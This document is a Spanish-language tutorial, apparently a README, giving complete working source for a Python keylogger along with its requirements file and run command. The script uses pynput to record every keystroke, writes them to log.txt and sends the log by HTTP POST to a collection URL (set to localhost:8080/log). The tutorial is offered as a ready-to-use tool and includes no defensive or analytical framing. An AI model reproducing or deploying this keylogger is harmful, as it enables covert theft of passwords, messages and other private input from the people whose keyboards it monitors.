##  Instalacion de librerias 

> Creacion del archivo para las librerias

```
requirements.txt
```

> Codigo del Archivo

```
altgraph==0.17.3
certifi==2022.12.7
charset-normalizer==3.0.1
idna==3.4
pefile==2023.2.7
pyinstaller==5.8.0
pyinstaller-hooks-contrib==2023.0
pynput==1.7.6
pywin32-ctypes==0.2.0
requests==2.28.2
six==1.16.0
urllib3==1.26.14

```


> Instalacion de las Librerias

```python
pip install -r ".\requirements.txt"
```
---------------------------------
##  Copiar el codigo para el Keylogger

> Creamos el archivo para el Keylogger
```
server.py
```

> Codigo del Archivo

```
import requests
from pynput.keyboard import Key, Listener

server_url = "http://localhost:8080/log"

keys = []


def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)


def convertir_string(keys):
    with open("log.txt", "w+") as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)

        # After writing the keys to the file, read the contents of the file and send it to the server
        logfile.seek(0)
        contents = logfile.read()
        enviar_datos(contents)


def enviar_datos(datos):
    try:
        # POST the data to the server
        response = requests.post(server_url, data=datos)
        if response.status_code == 200:
            print("Datos enviados correctamente")
        else:
            print(
                f"Error al enviar datos al servidor. Código de respuesta: {response.status_code}"
            )
    except requests.exceptions.RequestException as e:
        print(f"No se pudo conectar con el servidor: {e}")


def soltar_tecla(key):
    if key == Key.esc:
        return False


with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()

```

> Ejecutamos el Keylogger
```
python server.py
```